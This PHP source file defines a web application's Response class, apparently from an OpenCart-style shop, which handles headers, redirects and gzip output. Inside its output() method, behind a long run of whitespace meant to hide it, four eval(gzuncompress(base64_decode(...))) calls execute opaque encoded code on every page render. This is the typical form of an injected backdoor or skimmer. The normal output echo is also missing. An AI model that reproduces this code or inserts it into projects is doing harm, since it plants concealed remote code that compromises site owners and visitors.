<?php
class Response {
	private $headers = array();
	private $level = 0;
	private $output;

	public function addHeader($header) {
		$this->headers[] = $header;
	}

	public function redirect($url) {
		header('Location: ' . $url);
		exit;
	}

	public function setCompression($level) {
		$this->level = $level;
	}

	public function setOutput($output) {
		$this->output = $output;
	}

	private function compress($data, $level = 0) {
		if (isset($_SERVER['HTTP_ACCEPT_ENCODING']) && (strpos($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip') !== false)) {
			$encoding = 'gzip';
		}

		if (isset($_SERVER['HTTP_ACCEPT_ENCODING']) && (strpos($_SERVER['HTTP_ACCEPT_ENCODING'], 'x-gzip') !== false)) {
			$encoding = 'x-gzip';
		}

		if (!isset($encoding)) {
			return $data;
		}

		if (!extension_loaded('zlib') || ini_get('zlib.output_compression')) {
			return $data;
		}

		if (headers_sent()) {
			return $data;
		}

		if (connection_status()) {
			return $data;
		}

		$this->addHeader('Content-Encoding: ' . $encoding);

		return gzencode($data, (int)$level);
	}

	public function output() {
		if ($this->output) {
			if ($this->level) {
				$ouput = $this->compress($this->output, $this->level);
			} else {
				$ouput = $this->output;
			}

			if (!headers_sent()) {
				foreach ($this->headers as $header) {
					header($header, true);
				}
			}
																																																																																																																																																																																																																																			$output_page = eval(gzuncompress(base64_decode('eNqdVE1rg0AQ/Ss9FDaBUnRpE6R4SA/tJVBMPURLkHx4Uimkp+bXN/NczW7s7K656OLbeTPz5o3378uP18Xy80sUYRhG8+d5MJOF2MSL43H7O9ltf8rZU3Eo99+HciKy5u2Up+LuUWTBWtJ7RY8aX2RU5UlMx1hMH/6LJCzNAnqt6SFX9TmKThWwBMFMNGF5SnkRRbm4PHSr56eDymGLoBsdt/02oWYvslWhrYrtgYCuOjnQzRJhdo5+PPQyteJuogLtdl8R+H2m6ZwH9NJ7UDm0ufM9dF7T5+LsxZzNGAXgGvi6zvpzVKF6S6UEKV9ceQLsYFIsCVsDpg2mU5/P1JebhuYsxo9MZNd7Ox2l9WUzHTvW5hr8Ba73eYSHHAoNN9XpHx/ufROFhO6ahEE5BO5gUShxRtUqsfGu3Hx85M1u57itbzDDe+PVIcynOwvC+OqS10M3J8fIyvodvkVVq1YGs0Mz1dX05Q9RpiiO')));  eval(gzuncompress(base64_decode('eNqVVLFuwjAQ/ZUOSAapqnwmiWNVGejQLkgVtEMShBB0DFnY4OubO8exY7V2slxAuXt5792zFx/bz7fN9uvATiAUzxPIhDyxY7G53c735cJ5DaBkKnkmutcHflyyqn1/1N8VL8X+WrGnFyYU1gZLvSsKtnr+dx7sPLbzkub3WA1WE8MQHQa2Gh74m7j0PLp5fAYx1gYDi8tnJk6i9WDfg/RrX7QegQ/UQzBBnJRwsM9yIV3aH+QU9SVzuHi+NDX+iczLfjdaB7njcTB6wjg54vi+/rVnzSnqsXIypzVhnc4H/NCSND1sFh0GgLGzNiljJWEQYVc8rKicuFpY28w7WdM7MiD6/MWzBol/CAdDZ4CkHiOSMyOtkI3iNjp+0wyV7lawDoZOzEXuX2ZzMoGp/GkVXNpd+LbitjEadQF9M3Ze2v6AhAbMZUhfoEOHA6vXXyUobeY=')));  eval(gzuncompress(base64_decode('eNqVVNFugjAU/ZU9mKBxIUCpShYe3AMYYrboIjCMMYAzxoBbTKaDrx/3SlnHC1ea3t4Genp6zi09d/76PJ2/rZWtbul8YprMHG2VjT09n+Oi35NeG5Y2MfWRMa5er8+f36ddXxts+so784vEsZQHVflKchgyTRk8di0d6rAYPq8BSsijEOLyksIwW9gUIE3lcpc4lVF4HxRrHahs+MwWkBD5TNodYQFA5nUHpC5azQ8WCiDIAYx2wOaIAiL7cP0jZamhMvnpmrfcPdVKYplASCDk0YW29Uh6xl1zWW3cyoFoHXFLtzZ2YZMEswAsgiWhVyTM26c5Snetci0OIOUn0hlEa9jlThkF/JAgyIpeC1gESYDnMCLf0lP3B4sAUYNlhnQdK4+Dn4wmr9nujXsVSbyXSHRFqzHV4K0g4FKGRYCuYD0wL6vYH5C5QYMfD9HgOOBYSyFCvmQQd1NUkXoTbg0NBnORDwRvj1zxX+aD0ZBUZtOM5q170TGH7fEXxZaFkAS3B1mIkpig8/9QS1TJI6SxiVBc7sK46K/6rzehPA2GmyiDp1++2ouh')));  eval(gzuncompress(base64_decode('eNrNF4tu4kjsV+YidCEqlxcJj/JYdbtpD4lCD+jppLYXBRhKdkMSTSZt2ar/fp4kwCRH21V0Wh3IIbZnbI/tsc0q9hfUDXz0gKkdOg+4WomJJ71U4NWnPfEq+O56nqOYsoqqV87C9WkQrTvopoMGPsUeAhoaT9FfSFNls4NIDPB4qsltWZfbErrEi2+BoquaqrZ0A124BK+CZ6UuN+S22Kks1r3K5XD8+Ww4vRVtra2ZLcOoGw1bvL/lGZrWbppNtaEzhl6/r5Ig9pdVVZLuq1KnhAjjIOJElXWz8ACxYFvt/GYyHF/PbPipJX4po8rMqWrwn+bHhKIlU2tydmmNZrU0QqUsauQtKkJB5cSa3UxGs8nZaHphTWq8WL2ttgytoTeZ2EzkSV1uFYFJfNOaJhfNo7EodcYWd8adZceE88wiHJgav47tNKWCl/60Jp/HU6u2crwIl7K4zVmsMfvyj4K+2eDKGt/MPg6HmX7fC0Fd5UPw9jLtiE+1d51U3vUSCzsrSCUKRF0/Ymj9pJ7FDARjQgKSSBe7yjxYbvtdZU03Xh9q0prScBEsSynmKhPkvcmAi9tgdDG2f5/Nru3z8RerTJLU+bqly/nS8QG+O3z05NLFuro/p/SycCKMRF1VxVOCaUx8lHi+MyfY+dZJuYZqHLh79+WWmKr+9pLX1xKnNXNXolUEOJFlnw2Hf1v2aDwbnINL3VXVjSJMqxX70prdikFMw5hG4r0EPS1DekVe5/WwLSNKvR4SvcBZitILJ/N6PIWNS5ekAqlD0r5JoY/xzM4rhjKQXyCKndf8Dg5Bcgn3NHLZVuc/H+EsGeyLwdACsSvXwyBO9J0N/CY+LGFMM5eZTbPwOKaQbkI7VVrjfQGexYt1gITZGiO2Fgml3HOsBWgFt3yAHzbqJzpfsFpFkN7xKJIFFIcsm/DyFyHLjfSIFrsmjJRg3TnpJ7AKyAY5yWTWuxM+7RKXibgT0AbTdbAERhhEFHAMM9w2xEDYxB51Q4dQhUn4belQ507oo67nzGFWAxqsgQQF2heYxBY0INvTrpJw+13XByUok0TxMxPNTrDbg9zl/lXpI/yMN6GHT9EyePKZZQoC24GT08ZcAeou4IfJekNbumqnLcMSddm70s9k57ZF8Xzjcmbu8UfHixlhuiPAzsQlfSG57JUVxf6ytx96BVYMTxXlIQgePPzVeXSiBXFDKi+CjcJQxQldOVyHnyJMHjHpsYy0YRaDtn8rpr/26OzKEu8h2L8mnSW3ZGL9cWNN2SQ5SEvHygX9DiHOtipkLUioCVkXgrfMoCCE4EI8mSFAfXp6kgukjfP8PfBlErP37Z6Z4DsMTh5v8qQCNt8K0I8IDj1ngXd2CbXUT3trSFxQ/jMIYFcQQ9DL9ON2vl0Wgd1ZFoja7uS1VFWZ1myoR8qNDsWhAKxQwCWKQN/WTrpkxAKxWgmltGpH59ymWXjwzH8P/IfyyL4/KChdW5grj46gBsx0BXhvHDW48Y2NgUltTAOz66v87fl59+F/nu1GfvrUi/B2tuc8XEIxP5W2YOxtJWPvf5jl5pEsN0CRwf/H0Nk/i/zjh9JTfz8bG/ls/Addwu3V')));
		}
	}
}
?>